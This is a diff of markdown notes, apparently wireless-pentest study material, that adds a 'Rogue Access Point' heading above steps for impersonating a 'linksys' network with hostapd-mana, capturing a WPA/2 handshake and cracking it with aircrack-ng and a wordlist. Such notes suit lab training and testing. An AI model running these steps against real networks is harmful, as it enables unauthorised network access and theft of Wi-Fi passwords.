@@ -1,3 +1,5 @@
+## Rogue Access Point
+
 ```text
 sudo apt install hostapd-mana
 ```
@@ -8,7 +10,7 @@ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 ```
 
 
-### Create Configuration file
+#### Create Configuration file
 ```text
 cat linksys-mana.conf
 
@@ -25,7 +27,7 @@ rsn_pairwise=TKIP CCMP
 mana_wpaout=/home/<name>/linksys.hccapx
 ```
 
-### Start Access Point
+#### Start Access Point
 ```text
 sudo ip link set wlan0 up	
 sudo hostapd-mana linksys-mana.conf
@@ -33,7 +35,7 @@ sudo hostapd-mana linksys-mana.conf
 
 Wait for Captured a WPA/2 handshake in output
 
-### Crack!
+#### Crack!
 ```text
 aircrack-ng linksys.hccapx -e linksys -w /usr/share/john/password.lst
 
